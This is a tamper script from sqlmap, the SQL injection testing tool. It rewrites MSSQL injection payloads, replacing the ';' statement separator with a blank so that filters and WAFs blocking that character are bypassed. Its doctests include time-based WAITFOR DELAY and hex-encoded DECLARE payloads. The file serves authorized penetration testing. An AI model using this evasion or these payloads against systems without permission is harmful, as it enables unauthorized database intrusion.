#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MSSQL))

def tamper(payload, **kwargs):
    """
    Replaces (MsSQL) statement separator ';' with a blank character

    Requirement:
        * Microsoft SQL Server

    Notes:
        * Useful to bypass filters/WAFs blocking the ';' character, as
          Transact-SQL does not require any separator between statements

    >>> tamper(";WAITFOR DELAY '0:0:5'--")
    " WAITFOR DELAY '0:0:5'--"
    >>> tamper(";DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x")
    ' DECLARE @x CHAR(9) SET @x=0x303a303a35 WAITFOR DELAY @x'
    >>> tamper("1' AND 'a'='a")
    "1' AND 'a'='a"
    """

    return re.sub(r";(?=\s*(?:WAITFOR|DECLARE|SET|EXEC(?:UTE)?|SELECT|INSERT|UPDATE|DELETE|CREATE|DROP|ALTER|TRUNCATE|BEGIN|IF|WHILE|PRINT|USE|GRANT|REVOKE|BACKUP|RESTORE|RECONFIGURE|SHUTDOWN|WITH)\b)", ' ', payload, flags=re.I) if payload else payload
